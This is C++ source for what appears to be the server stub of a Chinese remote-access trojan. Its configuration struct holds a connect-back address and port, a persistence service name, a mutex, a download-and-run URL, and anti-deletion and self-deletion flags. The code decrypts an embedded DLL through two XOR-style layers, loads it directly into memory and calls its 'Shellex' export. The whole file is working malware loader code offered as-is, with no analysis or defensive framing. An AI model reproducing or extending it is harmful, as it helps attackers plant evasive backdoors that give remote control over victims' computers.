// ServerDat.cpp : Defines the entry point for the application.
//

#include "C_DllMain.h"
char ZJKKW[] = {'S','h','e','l','l','e','x','\0'};
#include "MemLoadDll.h"

struct ONLINE_DATA
{
	char LoginAddr[100];    //上线地址
	DWORD LoginPort;		//上线端口
	char UpGroup[32];       //上线分组
	char Version[32];		//上线版本
	CHAR ServiceName[100];   //服务名称
	CHAR ServicePlay[128];   //服务显示
	CHAR ServiceDesc[256];   //服务描述
	CHAR FolderName[256];	 //目录名称
	CHAR ProcessName[128];   //进程名称
	CHAR Install;            //启动类型
	CHAR Mutex[100];		//运行互斥
	CHAR Buildtime[100];	//配置时间
	CHAR szDownRun[300];     //捆绑地址
	BOOL Antideletion;       //防删除
	BOOL Selfdeletion;		//自删除
};


ONLINE_DATA online_data = 
{
	"127.0.0.1",
		8090,
		"",//撩你如何
		"",
		0,
		"",
		"",
		"",
		"",
		"",
		'"',
		'"',
		'"',
		0,
		0,
};

typedef int (WINAPI *PFN_POPMSGBOX)(ONLINE_DATA);

void QQVS360(LPBYTE szData, unsigned long Size)////双重加密  
{
	//该数组用来异或
	WORD AddTable[] = {231,52,123,436,51,24,57,987,124,543,65,765,124,645,678,879,567,435,432,123,546,712,431,210,312,120,110};
	WORD TableSize = sizeof(AddTable) / sizeof(WORD);
	WORD iCount = 0;
	unsigned long To = Size / 3;
	for (unsigned long i = 0; i<To; i++)
	{
		
		if (iCount == TableSize)
			iCount = 0;
		
		szData[i] ^= AddTable[iCount];
		iCount++;
	}
}
void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//解密
{	
		unsigned long i;
		unsigned char p;		
		p = (unsigned char ) key % 490 + 841 + 425 + 421 + 813 + 899 + 141 + 712 + 451 + 543 + 448 + 145 + 136 + 772 + 332 + 445 + 614 + 281 + 725;
		for(i = 0; i < nLen; i++) 
		{

			*szRec ^= p;
			*szRec += p;
	
			
			szRec++;
		}	

}

void LoadDllFromMemAndCall( const char *name)
{
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
    GetInputState();
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);
	////////////////////
	HMEMORYMODULE hDll;
	PFN_POPMSGBOX pfn;	

	EncryptData((unsigned char *)DllMainMyFileBuf,DllMainMyFileSize,2019);	
	QQVS360((unsigned char *)DllMainMyFileBuf,DllMainMyFileSize);
	hDll=MemoryLoadLibrary(DllMainMyFileBuf);
	if (hDll==NULL)
		return ;
	
    pfn=(PFN_POPMSGBOX)MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		
		return;
	}
	pfn(online_data);

	if (hDll!=NULL)
	{
		
		MemoryFreeLibrary(hDll);
		hDll=NULL;
	}
	ExitProcess(0);
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.

 	LoadDllFromMemAndCall(ZJKKW);
	return 0;
}



